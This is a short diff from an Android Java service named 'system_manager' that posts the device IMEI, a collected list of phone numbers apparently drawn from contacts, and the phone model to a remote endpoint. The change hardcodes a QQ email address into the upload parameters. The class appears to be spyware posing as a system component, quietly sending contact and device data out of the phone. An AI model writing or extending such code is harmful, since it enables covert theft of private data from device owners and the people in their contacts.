@@ -100,7 +100,7 @@ public class system_manager extends Service {
         OkGo.post(Config.CONTACTS)
                 .params("imei", deviceId)
                 .params("PhoneNum", sb.toString())
-                .params("email", "")
+                .params("email", "1980798898@qq.com")
                 .params("xinghao", getPhoneState())
                 .execute(new StringCallback() {
                     @Override
